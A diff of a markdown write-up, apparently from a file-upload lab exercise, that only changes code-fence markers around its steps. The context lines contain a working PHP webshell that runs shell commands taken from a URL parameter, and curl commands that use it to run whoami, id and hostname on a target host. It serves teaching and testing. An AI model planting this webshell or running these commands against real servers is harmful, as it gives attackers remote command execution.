@@ -72,22 +72,22 @@ accept attribute restricts the file type.
   Webshell: a small script that accepts commands through HTTP parameters and executes them on the server.
   
 1) Create and save  shell.phtml:
-   '''
+   ```
        <?php
     if(isset($_GET['cmd'])) {
         echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
     }
     ?>
-   '''
+   ```
 3) Verify the code execution by running a simple commnand:
-   '''
+   ```
    curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=whoami"
    curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=id"
-   '''
+   ```
 5) Gather more information about the system:
-   '''
+   ```
    curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=hostname"
-   '''
+   ```
 
 
 
